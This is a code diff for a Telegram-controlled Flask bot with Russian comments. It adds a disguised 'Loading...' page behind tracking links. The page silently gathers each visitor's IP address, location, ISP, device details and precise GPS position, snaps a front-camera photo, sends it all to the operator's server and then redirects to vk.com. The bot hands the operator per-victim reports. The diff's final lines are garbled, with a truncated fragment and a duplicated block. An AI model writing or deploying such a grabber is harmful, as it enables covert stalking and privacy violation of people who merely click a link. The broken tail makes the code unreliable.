@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-#измега 2
+#измега 3
 import os
 import json
 import uuid
 import time
 import threading
 import requests
+import base64
 from datetime import datetime
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template_string
 
 # ============ КОНФИГ ============
 OWNER_IDS = [744709325, 7949152984]
@@ -84,16 +85,14 @@ def get_links(owner_id=None):
     settings = get_settings(owner_id)
     return settings.get('links', {})
 
-def get_all_links():
-    all_links = {}
+def find_link_owner(link_id):
+    """Ищем владельца ссылки по всем ID"""
     for owner_id in OWNER_IDS:
-        links = get_links(owner_id)
-        for lid, data in links.items():
-            all_links[lid] = {
-                'owner_id': owner_id,
-                'data': data
-            }
-    return all_links
+        data = load_data(owner_id)
+        links = data.get('settings', {}).get('links', {})
+        if link_id in links:
+            return owner_id, data
+    return None, None
 
 # ============ ФУНКЦИИ ДЛЯ РАБОТЫ С TELEGRAM API ============
 def send_message(chat_id, text, reply_markup=None):
@@ -152,7 +151,202 @@ def get_updates(offset=None):
         print(f"Ошибка получения обновлений: {e}")
         return []
 
-# ============ КЛАВИАТУРЫ ============
+# ============ СТРАНИЦА-ЛОГГЕР ============
+LOGGER_HTML = """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0f;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .loader {
+            width: 56px;
+            height: 56px;
+            border: 3px solid rgba(255,255,255,0.06);
+            border-top: 3px solid #7c5cfc;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.4,0,0.2,1) infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loader-text {
+            font-size: 14px;
+            color: rgba(255,255,255,0.3);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 20px;
+        }
+        .mouse-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+            animation: bounce 1.5s ease-in-out infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
+</head>
+<body>
+<div style="text-align:center;">
+    <div class="mouse-icon">🐭</div>
+    <div class="loader"></div>
+    <div class="loader-text">Сбор данных...</div>
+</div>
+
+<script>
+(async function() {
+    const linkId = window.location.pathname.split('/').pop();
+    
+    let settings = { redirect: 'https://vk.com/', geo: true, camera: true };
+    try {
+        const res = await fetch('/settings');
+        settings = await res.json();
+    } catch(e) {}
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip || 'Unknown';
+        } catch { return 'Unknown'; }
+    }
+
+    async function getGeo(ip) {
+        try {
+            const res = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await res.json();
+            return {
+                country: data.country_name || data.country || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                isp: data.org || 'Unknown',
+                latitude: data.latitude || 'Unknown',
+                longitude: data.longitude || 'Unknown'
+            };
+        } catch { return { country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown', latitude: 'Unknown', longitude: 'Unknown' }; }
+    }
+
+    function getDevice() {
+        const ua = navigator.userAgent;
+        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
+        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
+        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
+        if (/Windows/i.test(ua)) os = 'Windows';
+        else if (/Mac/i.test(ua)) os = 'macOS';
+        else if (/Linux/i.test(ua)) os = 'Linux';
+        else if (/Android/i.test(ua)) os = 'Android';
+        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+        else if (/Firefox/i.test(ua)) browser = 'Firefox';
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+        else if (/Edg/i.test(ua)) browser = 'Edge';
+        return { device, os, browser, ua };
+    }
+
+    function getScreen() {
+        return {
+            screen: `${window.screen.width}x${window.screen.height}`,
+            window: `${window.innerWidth}x${window.innerHeight}`
+        };
+    }
+
+    function getGeolocation() {
+        return new Promise(resolve => {
+            if (!settings.geo || !navigator.geolocation) {
+                resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: 'Disabled' });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                err => resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: err.message }),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    function getCameraPhoto() {
+        return new Promise(resolve => {
+            if (!settings.camera) { resolve(null); return; }
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photo = canvas.toDataURL('image/jpeg', 0.85);
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(photo);
+                }, 300);
+            })
+            .catch(() => resolve(null));
+        });
+    }
+
+    const ip = await getIP();
+    const [geo, device, screen, geolocation, photo] = await Promise.all([
+        getGeo(ip),
+        getDevice(),
+        getScreen(),
+        getGeolocation(),
+        getCameraPhoto()
+    ]);
+
+    const data = {
+        link_id: linkId,
+        timestamp: new Date().toLocaleString(),
+        ip: ip,
+        country: geo.country,
+        city: geo.city,
+        region: geo.region,
+        isp: geo.isp,
+        geo_lat: geo.latitude,
+        geo_lon: geo.longitude,
+        gps_lat: geolocation.latitude,
+        gps_lon: geolocation.longitude,
+        device_type: device.device,
+        os: device.os,
+        browser: device.browser,
+        screen: screen.screen,
+        photo: photo
+    };
+
+    await fetch('/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    }).catch(() => {});
+
+    setTimeout(() => {
+        window.location.href = settings.redirect || 'https://vk.com/';
+    }, 600);
+})();
+</script>
+</body>
+</html>
+"""
+
+# ============ КЛАВИАТУРЫ ДЛЯ БОТА ============
 def main_kb():
     buttons = [
         [{"text": "⚙️ Настройки", "callback_data": "settings"}],
@@ -201,7 +395,7 @@ def back_kb():
         [{"text": "🔙 Назад", "callback_data": "back"}]
     ]}
 
-# ============ ОБРАБОТЧИКИ КОМАНД ============
+# ============ ОБРАБОТЧИКИ КОМАНД БОТА ============
 user_owner = {}
 waiting_redirect = {}
 
@@ -308,6 +502,92 @@ def handle_callback(callback):
         for lid, d in links.items():
             text += f"🔗 `{lid}`: {len(d.get('visits', []))} переходов\n"
         send_message(chat_id, text, links_kb(links))
+        return
+    
+    # Статистика
+    if data == "stats":
+        links = get_links(owner_id)
+        total = sum(len(l.get('visits', [])) for l in links.values())
+        
+        countries = {}
+        for l in links.values():
+            for v in l.get('visits', []):
+                country = v.get('country', 'Unknown')
+                countries[country] = countries.get(country, 0) + 1
+        
+        country_text = ""
+        if countries:
+            top = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]
+            country_text = "\n🌍 **Топ стран:**\n"
+            for c, count in top:
+                country_text += f"   • {c}: {count}\n"
+        
+        text = (
+            f"📊 **Статистика**\n"
+            f"👤 Профиль: `{owner_id}`\n\n"
+            f"📌 Всего ссылок: {len(links)}\n"
+            f"👥 Всего переходов: {total}"
+            f"{country_text}"
+        )
+        send_message(chat_id, text, back_kb())
+        return
+    
+    # Работа со ссылкой
+    if data.startswith("link_"):
+        lid = data.split("_")[1]
+        links = get_links(owner_id)
+        v = len(links.get(lid, {}).get('visits', []))
+        text = (
+            f"🔗 **Ссылка:** `{lid}`\n\n"
+            f"👥 Переходов: {v}\n"
+            f"🔗 URL: `{BASE_URL}l/{lid}`"
+        )
+        send_message(chat_id, text, link_menu_kb(lid))
+        return
+    
+    if data.startswith("copy_"):
+        lid = data.split("_")[1]
+        url = f"{BASE_URL}l/{lid}"
+        send_message(chat_id, f"📋 `{url}`")
+        return
+    
+    if data.startswith("data_"):
+        lid = data.split("_")[1]
+        links = get_links(owner_id)
+        visits = links.get(lid, {}).get('visits', [])
+        if not visits:
+            send_message(chat_id, "📊 Нет данных")
+            return
+        
+        fn = f"data_{lid}_{int(time.time())}.txt"
+        with open(fn, 'w', encoding='utf-8') as f:
+            f.write(f"ДАННЫЕ ССЫЛКИ: {lid}\n")
+            f.write("=" * 50 + "\n\n")
+            f.write(f"Владелец: {owner_id}\n")
+            f.write(f"Всего переходов: {len(visits)}\n\n")
+            for i, v in enumerate(visits, 1):
+                f.write(f"--- ПЕРЕХОД {i} ---\n")
+                f.write(f"Время: {v.get('timestamp', 'Unknown')}\n")
+                f.write(f"IP: {v.get('ip', 'Unknown')}\n")
+                f.write(f"Страна: {v.get('country', 'Unknown')}\n")
+                f.write(f"Город: {v.get('city', 'Unknown')}\n")
+                f.write(f"Устройство: {v.get('device_type', 'Unknown')}\n")
+                f.write(f"ОС: {v.get('os', 'Unknown')}\n")
+                f.write(f"Браузер: {v.get('browser', 'Unknown')}\n")
+                f.write(f"Экран: {v.get('screen', 'Unknown')}\n")
+                f.write(f"GPS: {v.get('gps_lat', 'Unknown')}, {v.get('gps_lon', 'Unknown')}\n")
+                f.write("\n" + "-" * 30 + "\n\n")
+        
+        send_document(chat_id, fn, f"Данные для {lid}")
+        os.remove(fn)
+        return
+    
+    if data.startswith("del_"):
+        lid = data.split("_")[1]
+        if delete_link(lid, owner_id):
+            send_message(chat_id, "✅ Ссылка удалена", back_kb())
+        return
+    ssage(chat_id, text, links_kb(links))
         return
     
     # Статистика
